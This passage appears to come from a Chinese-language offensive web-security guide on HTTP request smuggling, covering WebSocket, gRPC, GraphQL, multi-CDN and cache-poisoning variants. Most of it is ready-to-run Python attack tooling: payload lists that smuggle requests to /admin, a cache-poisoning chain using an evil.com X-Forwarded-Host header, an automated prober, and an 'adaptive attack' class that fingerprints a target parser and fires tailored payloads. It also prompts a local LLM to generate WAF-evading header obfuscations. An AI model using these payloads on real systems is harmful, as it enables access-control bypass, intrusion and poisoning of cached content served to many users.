    
    ws.close()

# 使用:
# websocket_smuggling_attack(
#     "wss://target.com/ws",
#     "GET /admin/users HTTP/1.1\r\nHost: internal-backend\r\nConnection: close\r\n\r\n"
# )

# ===== WebSocket 走私在 CDN 中的持久化投毒 =====
# 某些 CDN 错误缓存 WebSocket 握手响应 (101)
# 导致后续用户复用被投毒的握手态

cdn_websocket_cache_poison = """
# CDN WebSocket 缓存投毒:
# 1. 攻击者发送 WebSocket upgrade 请求
# 2. CDN 返回 101 并缓存响应
# 3. 后续用户请求相同路径 → CDN 返回缓存的 101
# 4. 用户浏览器建立 WebSocket 连接到攻击者控制的端点
"""
```

#### 10.4.2 gRPC-HTTP 走私 & GraphQL 走私

```python
#!/usr/bin/env python3
"""
gRPC-HTTP 走私 & GraphQL 走私 (2026 新变体)
"""
import requests
import json

# ===== gRPC-HTTP 走私 =====
# gRPC 使用 HTTP/2 作为传输层
# gRPC-web 使用 HTTP/1.1 作为传输层
# gRPC → gRPC-web 降级时产生走私

grpc_smuggling_payloads = [
    # Payload 1: gRPC trailer 走私
    # gRPC 使用 HTTP trailer 传递状态码
    # 如果 trailer 在降级时被错误处理 → 走私
    {
        "method": "POST",
        "path": "/grpc.Service/Method",
        "headers": {
            "Content-Type": "application/grpc",
            "TE": "trailers",
            "grpc-timeout": "1S",
        },
        "body": b'\x00\x00\x00\x00\x00' + b'SMUGGLED_REQUEST',
    },
    # Payload 2: gRPC-web → gRPC 降级走私
    {
        "method": "POST",
        "path": "/grpc.Service/Method",
        "headers": {
            "Content-Type": "application/grpc-web+proto",
            "X-Grpc-Web": "1",
        },
        "body": b'\x00\x00\x00\x00\x05' + b'Hello' + b'SMUGGLED',
    },
]

# ===== GraphQL 走私 =====
# GraphQL 的批量查询 (Batch Query) 和订阅 (Subscription) 可被用于走私

graphql_smuggling_payloads = [
    # Payload 1: GraphQL 批量查询走私
    # 通过批量查询绕过 WAF → 走私恶意查询
    {
        "query": """
        [
            { __typename },
            { __typename },
            { smuggled: __typename }
        ]
        """,
        "operationName": "smuggled",
    },
    # Payload 2: GraphQL 订阅 + HTTP 走私
    # GraphQL 订阅使用 WebSocket 或 SSE
    # 升级到 WebSocket 后走私 HTTP 请求
    {
        "query": """
        subscription {
            smuggledEvent {
                id
                data
            }
        }
        """,
        "extensions": {
            "smuggled": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
        }
    },
    # Payload 3: GraphQL 持久化查询走私
    # 如果持久化查询的 hash 可被猜测
    # 攻击者可以替换为恶意查询
    {
        "extensions": {
            "persistedQuery": {
                "version": 1,
                "sha256Hash": "REPLACED_WITH_SMUGGLED_QUERY"
            }
        }
    },
]

# ===== 多 CDN 链走私 =====
# 请求经过多个 CDN → 每个 CDN 的 HTTP 解析可能不同
# 攻击者利用 CDN 链中的解析差异

multi_cdn_smuggling_chain = """
# 多 CDN 链走私:
# Client → Cloudflare → Fastly → Origin

# 攻击链:
# 1. Cloudflare 解析 HTTP/2 → 降级到 HTTP/1.1
# 2. Fastly 重新解析 HTTP/1.1 → 再降级到 HTTP/1.1
# 3. 两次降级产生双重歧义

# Payload: 在 Cloudflare 和 Fastly 之间制造走私
# Cloudflare 看到: 一个请求 (HTTP/2 帧)
# Fastly 看到: 两个请求 (HTTP/1.1 走私)
# Origin 看到: 三个请求 (再次走私)
"""

# ===== 缓存投毒 + 走私组合 =====
# 走私 + 缓存投毒 = 持久化攻击

cache_poison_smuggling_combo = """
# 攻击链:
# 1. 走私请求 → 修改后端响应的缓存键
# 2. 后端返回被投毒的响应
# 3. CDN 缓存投毒响应
# 4. 所有后续用户收到投毒内容

# 示例:
# 走私请求: GET /normal-page HTTP/1.1
#           Host: target.com
#           X-Forwarded-Host: evil.com
# 
# → 后端使用 X-Forwarded-Host 生成响应
# → CDN 缓存了包含 evil.com 链接的响应
# → 所有用户看到恶意链接
"""
```

#### 10.4.3 2026 走私变体速查表

| 变体 | 协议 | 利用难度 | 影响 | 2026 状态 |
|------|------|---------|------|----------|
| CL.TE | HTTP/1.1 | 低 | 高 | 基本关闭 (RFC 9112) |
| TE.CL | HTTP/1.1 | 低 | 高 | 基本关闭 (RFC 9112) |
| TE.TE | HTTP/1.1 | 中 | 高 | 仍可利用 (混淆) |
| H2.CL | HTTP/2→1.1 | 中 | 高 | 主要战场 |
| H2.TE | HTTP/2→1.1 | 中 | 高 | 主要战场 |
| H2 CRLF | HTTP/2→1.1 | 高 | 极高 | 可利用 |
| H3 QUIC Stream | HTTP/3→1.1 | 高 | 极高 | 新兴 |
| WebSocket 走私 | WS→HTTP | 中 | 高 | 可利用 |
| gRPC-HTTP 走私 | gRPC→HTTP | 高 | 中 | 新兴 |
| GraphQL 走私 | GraphQL | 中 | 中 | 可利用 |
| 多 CDN 链 | 混合 | 极高 | 极高 | 理论+实例 |
| 缓存投毒+走私 | 混合 | 中 | 极高 | 可利用 |

---

### 10.5 AI 驱动的走私检测与利用

#### 10.5.1 LLM 辅助走私变异生成

```python
#!/usr/bin/env python3
"""
AI 驱动的 HTTP 请求走私变异生成
利用 LLM 自动生成新的走私 payload 变体
"""
import json
import requests
import itertools

class AISmugglingMutator:
    """AI 驱动的走私 payload 变异器"""
    
    def __init__(self, base_payload, llm_endpoint="http://localhost:11434/api/generate"):
        self.base_payload = base_payload
        self.llm_endpoint = llm_endpoint
        self.mutations = []
    
    def generate_te_obfuscation_variants(self):
        """生成 Transfer-Encoding 混淆变体"""
        base_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding:\x0bchunked",
            "Transfer-Encoding:\x0cchunked",
            "Transfer-Encoding:\nchunked",
        ]
        
        # 使用 LLM 生成更多变体
        prompt = f"""Generate additional HTTP Transfer-Encoding header obfuscation variants.
These should bypass WAF rules while still being interpreted as chunked by some backends.

Current variants:
{chr(10).join(base_variants)}

Generate 10 new obfuscation variants that use:
1. Unicode characters
2. Line folding
3. Multiple headers
4. Case variations
5. Encoding tricks

Output as JSON array of strings."""
        
        try:
            resp = requests.post(self.llm_endpoint, json={
                "model": "codellama:34b",
                "prompt": prompt,
                "stream": False
            })
            llm_variants = json.loads(resp.json().get('response', '[]'))
            return base_variants + llm_variants
        except:
            return base_variants
    
    def generate_cl_te_combinations(self):
        """生成 CL+TE 组合变体"""
        cl_values = [0, 1, 4, 13, 42, 100, 0xFFFFFFFF]
        te_values = [
            "chunked",
            "chunked, identity",
            "identity, chunked",
            "identity",
        ]
        
        combinations = []
        for cl in cl_values:
            for te in te_values:
                combinations.append({
                    "Content-Length": str(cl),
                    "Transfer-Encoding": te,
                })
        
        return combinations
    
    def run_llm_mutation(self, num_variants=50):
        """使用 LLM 生成大量变异"""
        prompt = f"""You are an HTTP request smuggling expert. Generate {num_variants} unique smuggling payload variants.

Base payload structure:
{json.dumps(self.base_payload, indent=2)}

Generate variants that:
1. Use different Transfer-Encoding obfuscation techniques
2. Try different Content-Length values
3. Use HTTP/2 downgrade tricks
4. Exploit edge-case parsing differences
5. Target specific CDN/proxy products

Output as JSON array of payload objects."""
        
        try:
            resp = requests.post(self.llm_endpoint, json={
                "model": "codellama:34b",
                "prompt": prompt,
                "stream": False
            })
            return json.loads(resp.json().get('response', '[]'))
        except:
            return [self.base_payload]
    
    def generate_all(self):
        """生成所有变异"""
        self.mutations = []
        
        # 1. TE 混淆变体
        te_variants = self.generate_te_obfuscation_variants()
        for te in te_variants:
            self.mutations.append({"Transfer-Encoding": te})
        
        # 2. CL+TE 组合
        self.mutations.extend(self.generate_cl_te_combinations())
        
        # 3. LLM 变异
        llm_mutations = self.run_llm_mutation(30)
        self.mutations.extend(llm_mutations)
        
        print(f"[+] 生成 {len(self.mutations)} 个变异 payload")
        return self.mutations

# 使用:
# mutator = AISmugglingMutator({
#     "method": "POST",
#     "path": "/",
#     "body": "0\r\n\r\nSMUGGLED"
# })
# variants = mutator.generate_all()
```

#### 10.5.2 自动化走私检测工具

```python
#!/usr/bin/env python3
"""
自动化 HTTP 请求走私检测工具
结合 AI 辅助判断 + 传统探测方法
"""
import requests
import time
import concurrent.futures
import json

class AutomatedSmugglingDetector:
    """自动化走私检测器"""
    
    def __init__(self, target, max_concurrency=5):
        self.target = target
        self.max_concurrency = max_concurrency
        self.findings = []
    
    def send_probe(self, probe_name, headers, body, timeout=10):
        """发送探测请求"""
        try:
            start = time.time()
            resp = requests.post(
                f"https://{self.target}/",
                headers=headers,
                data=body,
                timeout=timeout,
                allow_redirects=False,
            )
            elapsed = time.time() - start
            
            return {
                "probe": probe_name,
                "status": resp.status_code,
                "elapsed": elapsed,
                "headers": dict(resp.headers),
                "body_preview": resp.text[:200],
            }
        except requests.exceptions.Timeout:
            return {
                "probe": probe_name,
                "status": "timeout",
                "elapsed": timeout,
                "headers": {},
                "body_preview": "",
            }
        except Exception as e:
            return {
                "probe": probe_name,
                "status": "error",
                "error": str(e),
            }
    
    def run_detection_suite(self):
        """运行完整检测套件"""
        
        probes = [
            # 1. CL.TE 探测
            {
                "name": "CL.TE",
                "headers": {
                    "Content-Length": "13",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED",
            },
            # 2. TE.CL 探测
            {
                "name": "TE.CL",
                "headers": {
                    "Content-Length": "4",
                    "Transfer-Encoding": "chunked",
                },
                "body": "35\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n0\r\n\r\n",
            },
            # 3. TE.TE 混淆探测
            {
                "name": "TE.TE-obfuscation",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "xchunked",
                },
                "body": "0\r\n\r\nSMUGGLED",
            },
            # 4. H2.CL 探测 (使用 HTTP/1.1 模拟)
            {
                "name": "H2.CL-simulated",
                "headers": {
                    "Content-Length": "0",
                },
                "body": "SMUGGLED_REQUEST_BODY",
            },
            # 5. CL.0 探测
            {
                "name": "CL.0",
                "headers": {
                    "Content-Length": "0",
                },
                "body": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
            },
            # 6. 分块混淆探测
            {
                "name": "chunked-obfuscation",
                "headers": {
                    "Transfer-Encoding": "chunked\r\nTransfer-Encoding: identity",
                },
                "body": "0\r\n\r\nSMUGGLED",
            },
        ]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_concurrency) as executor:
            futures = {}
            for probe in probes:
                future = executor.submit(
                    self.send_probe,
                    probe["name"],
                    probe["headers"],
                    probe["body"]
                )
                futures[future] = probe["name"]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                probe_name = futures[future]
                print(f"[*] {probe_name}: HTTP {result['status']}")
                
                # 分析结果
                if result['status'] == 200 or result['status'] == 'timeout':
                    self.findings.append({
                        "probe": probe_name,
                        "result": result,
                        "severity": "high" if result['status'] == 'timeout' else "medium",
                    })
        
        return self.findings
    
    def generate_report(self):
        """生成检测报告"""
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "findings": self.findings,
            "summary": {
                "total_probes": len(self.findings),
                "high_severity": len([f for f in self.findings if f['severity'] == 'high']),
                "medium_severity": len([f for f in self.findings if f['severity'] == 'medium']),
            }
        }
        return report

# 使用:
# detector = AutomatedSmugglingDetector("target.com")
# findings = detector.run_detection_suite()
# report = detector.generate_report()
# print(json.dumps(report, indent=2))
```

#### 10.5.3 自适应走私 payload 生成

```python
#!/usr/bin/env python3
"""
自适应走私 payload 生成器
根据目标响应自动调整 payload 策略
"""
import requests
import json
import time
import random

class AdaptiveSmugglingGenerator:
    """自适应走私 payload 生成器"""
    
    def __init__(self, target):
        self.target = target
        self.learned_behaviors = {}
        self.successful_payloads = []
    
    def probe_parser_behavior(self):
        """探测目标 HTTP 解析器行为"""
        behaviors = {}
        
        # 1. 测试 CL 优先还是 TE 优先
        cl_te_response = self._send_probe(
            {"Content-Length": "13", "Transfer-Encoding": "chunked"},
            "0\r\n\r\nSMUGGLED"
        )
        if cl_te_response['status'] == 400:
            behaviors['rejects_dual_headers'] = True
        else:
            behaviors['rejects_dual_headers'] = False
        
        # 2. 测试 TE 混淆容忍度
        te_variants = [
            ("Transfer-Encoding: chunked", "normal"),
            ("Transfer-Encoding: xchunked", "x-prefix"),
            ("Transfer-Encoding : chunked", "space-colon"),
            ("Transfer-Encoding:\tchunked", "tab"),
            ("Transfer-Encoding:\x0bchunked", "vertical-tab"),
        ]
        
        for header, name in te_variants:
            resp = self._send_probe(
                {header: "chunked", "Content-Length": "100"},
                "0\r\n\r\nSMUGGLED"
            )
            behaviors[f'te_{name}'] = resp['status'] != 400
        
        # 3. 测试 HTTP/2 支持
        # (需要 HTTP/2 客户端)
        behaviors['supports_h2'] = False  # 默认
        
        self.learned_behaviors = behaviors
        return behaviors
    
    def _send_probe(self, headers, body):
        """发送探测请求"""
        try:
            resp = requests.post(
                f"https://{self.target}/",
                headers=headers,
                data=body,
                timeout=10
            )
            return {"status": resp.status_code, "text": resp.text[:200]}
        except:
            return {"status": "error", "text": ""}
    
    def generate_targeted_payloads(self):
        """根据学习到的行为生成针对性 payload"""
        behaviors = self.learned_behaviors
        payloads = []
        
        # 如果目标不接受双 headers → 使用 TE.TE 混淆
        if behaviors.get('rejects_dual_headers'):
            if behaviors.get('te_x-prefix'):
                payloads.append({
                    "strategy": "TE.TE x-prefix",
                    "headers": {
                        "Content-Length": "100",
                        "Transfer-Encoding": "xchunked",
                    },
                    "body": "0\r\n\r\nSMUGGLED_REQUEST",
                })
        
        # 如果目标接受某些 TE 混淆 → 使用 CL.TE 等效
        if behaviors.get('te_tab'):
            payloads.append({
                "strategy": "CL.TE via tab obfuscation",
                "headers": {
                    "Content-Length": "13",
                    "Transfer-Encoding:\tchunked": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED_REQUEST",
            })
        
        # 如果目标接受 vertical-tab → 使用 CL.TE 等效
        if behaviors.get('te_vertical-tab'):
            payloads.append({
                "strategy": "CL.TE via vertical-tab",
                "headers": {
                    "Content-Length": "13",
                    "Transfer-Encoding:\x0bchunked": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED_REQUEST",
            })
        
        # 如果以上都不行 → 尝试 H2 降级
        if not payloads:
            payloads.append({
                "strategy": "H2 downgrade (simulated)",
                "headers": {
                    "Content-Length": "0",
                },
                "body": "GET /admin HTTP/1.1\r\nHost: " + self.target + "\r\n\r\n",
            })
        
        return payloads
    
    def execute_adaptive_attack(self):
        """执行自适应攻击"""
        print(f"[*] 阶段1: 探测 {self.target} 的解析器行为...")
        behaviors = self.probe_parser_behavior()
        print(f"    学习到的行为: {json.dumps(behaviors, indent=2)}")
        
        print(f"[*] 阶段2: 生成针对性 payload...")
        payloads = self.generate_targeted_payloads()
        print(f"    生成 {len(payloads)} 个 payload")
        
        print(f"[*] 阶段3: 发送攻击 payload...")
        for i, payload in enumerate(payloads):
            print(f"    [{i+1}] {payload['strategy']}")
            result = self._send_probe(payload['headers'], payload['body'])
            if result['status'] != 400:
                self.successful_payloads.append({
                    **payload,
                    "result": result,
                })
                print(f"        [+] 成功: HTTP {result['status']}")
            else:
                print(f"        [-] 被拒绝: HTTP 400")
        
        return self.successful_payloads

# 使用:
# generator = AdaptiveSmugglingGenerator("target.com")
# successful = generator.execute_adaptive_attack()
# print(f"\n[+] 成功 payload: {len(successful)}")
# for sp in successful:
#     print(f"    - {sp['strategy']}")
```
